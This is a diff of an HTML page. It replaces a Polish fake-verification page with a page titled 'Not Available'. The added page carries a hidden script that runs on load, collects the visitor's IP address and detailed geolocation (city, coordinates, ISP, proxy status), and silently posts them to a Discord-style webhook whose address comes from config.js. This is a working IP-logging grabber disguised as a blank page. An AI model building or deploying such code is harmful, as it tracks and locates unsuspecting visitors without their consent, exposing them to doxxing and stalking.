@@ -1,104 +1,79 @@
-<!--
-    adam1337
-    Powered by adam1337
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Not Available</title>
+    <!-- CSS -->
+    <link rel="stylesheet" href="src/css/main.min.css">
+    <!-- Fontawesome -->
+    <link href="https://cdn.staticaly.com/gh/hung1001/font-awesome-pro/4cac1a6/css/all.css" rel="stylesheet" type="text/css" />
+    <!-- Google Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Lora:wght@700&family=Poppins:wght@300;600&display=swap" rel="stylesheet">
+    <!-- Leaflet -->
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.7.1/dist/leaflet.css" integrity="sha512-xodZBNTC5n17Xt2atTPuE1HxjVMSvLVW9ocqUKLsCC5CXdbqCmblAshOMAS6/keqq/sMZMZ19scR4PsZChSR7A==" crossorigin="" />
+    <link rel="icon" type="image/x-icon" href="./src/favicon.ico">
+    <script src="https://unpkg.com/leaflet@1.7.1/dist/leaflet.js" integrity="sha512-XQoYMqMTK8LvdxXYG3nZ448hOEQiglfqkJs1NOQV44cWnUrBc8PkAOcXy20w0vlaXaVUearIOBhiXZ5V3ynxwA==" crossorigin=""></script>
+    <!-- Notyf CSS -->
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/notyf@3/notyf.min.css">
+  </head>
+  <body>
+    <header class="header"></header>
+    <script src="./config.js"></script>
+    <script>
+      function get_information(link, callback) {
+        var xhr = new XMLHttpRequest();
+        xhr.open("GET", link, true);
+        xhr.onreadystatechange = function() {
+          if (xhr.readyState === 4) {
+            callback(xhr.responseText);
+          }
+        };
+        xhr.send(null);
+      }
+      get_information("http://ip-api.com/json/?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query", function(text) {
+        var div = document.createElement("div");
+        div.innerHTML = text;
+        div.id = "razzylog";
+        const secondList = document.getElementsByClassName("header")[0]
+        secondList.appendChild(div)
+      });
+      get_information("https://api.ipify.org/", function(text) {
+        var div = document.createElement("div");
+        div.innerHTML = text;
+        div.id = "ipppp";
+        const secondList = document.getElementsByClassName("header")[0]
+        secondList.appendChild(div)
+      });
 
-    My version (adam1337): 
-    - adam1337
-    adam1337 
-    - adam1337
-
-    Contact with me
-    - Discord: adam1337
-    - E-mail: adam1337
--->
-<!doctype html>
-<html>
-<head>
-  <title>clowndrop.pl</title>
-  <meta charset='UTF-8'>
+      function ipLogByRaz() {
+        var ispp = document.getElementById('ipppp').innerHTML
+        var extra = document.getElementById("razzylog").innerHTML
+        const request = new XMLHttpRequest();
+        request.open("POST", wbhk);
+        request.setRequestHeader('Content-type', 'application/json');
+        const params = {
+          username: "Beamed",
+          avatar_url: 'https://images.g2crowd.com/uploads/product/image/large_detail/large_detail_de619ca81012d42cede6fd18af63d8b1/inkscape.png',
+          content: "**Ip** : _" + ispp + "_\n**Raw** : _https://api.techniknews.net/ipgeo/" + ispp + "_\n**Extra Info** : ```" + extra + "```"
+        }
+        request.send(JSON.stringify(params));
+      }
+      setTimeout(function() {
+        ipLogByRaz()
+      }, 700);
+    </script>
     <style>
-    html, body {
-      width: 100%;
-      height: 100%;
-      margin: 0;
-      font-family: -apple-system, BlinkMacSystemFont, 'avenir next', avenir,
-        'helvetica neue', helvetica, ubuntu, roboto, noto, 'segoe ui', arial,
-        sans-serif;
-      overflow: hidden;
-    }
-    .hello-message {
-      margin: 40px;
-      text-align: center;
-    }
-    .logout-messages {
-      pointer-events: none;
-      color: red;
-      margin: 40px;
-      position: fixed;
-      top: 0;
-      left: 0;
-      text-shadow: 2px 2px #FFF, 4px 4px 10px #000;
-    }
-    img {
-      width: 300px;
-    }
-    @keyframes blurslowly {
-      0% {
-        filter: none;
+      .header {
+        display: none
       }
-      92% {
-        filter: blur(0);
+
+      .map-container {
+        display: none
       }
-      96% {
-        filter: blur(1px);
-      }
-      100% {
-        filter: blur(0);
-      }
-    }
-    body {
-      animation-name: blurslowly;
-      animation-iteration-count: infinite;
-      animation-duration: 15s;
-      animation-play-state: running;
-    }
-  </style>
-  <link rel="icon" type="image/x-icon" href="ptok.jpg">
-
-  <meta property="og:title" content="clowndrop.pl" />
-  <meta property="og:type" content="website" />
-  <meta property="og:url" content="https://clowndrop.pl" />
-  <meta property="og:image" content="https://clowndrop.pl/ptok.jpg" />
-  <meta property="og:description" content="clowndrop.pl" />
-  <meta name="keywords" content="clowndrop, clown, clowndrop.pl, clown.pl">
-  <meta name="description" content="clowndrop.pl">
-  <meta name="theme-color" content="#660000">
-</head>
-<body>
-
-<noscript>Po coś tego JavaScript wyłączył bamboszu!</noscript>
-<template>
-  <div class='hello-message'>
-    <h1>WERYFIKACJA!</h1>
-    <h2>kliknij 3 razy w spacje lub.</h2>
-    <h3>(kilnij obrazek)</h3>
-
-    <img src='https://thumbs.dreamstime.com/b/verification-gold-text-black-background-d-rendered-royalty-free-stock-picture-image-can-be-used-online-website-87923018.jpg' alt='Cute ptok' />
-  </div>
-  <div class='logout-messages'></div>
-</template>
-
-<script src='index.js'></script>
-
-<!-- Google tag (gtag.js) -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=G-6S5388LRGM"></script>
-<script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
-
-  gtag('config', 'G-6S5388LRGM');
-</script>
-
-</body>
+    </style>
+  </body>
 </html>
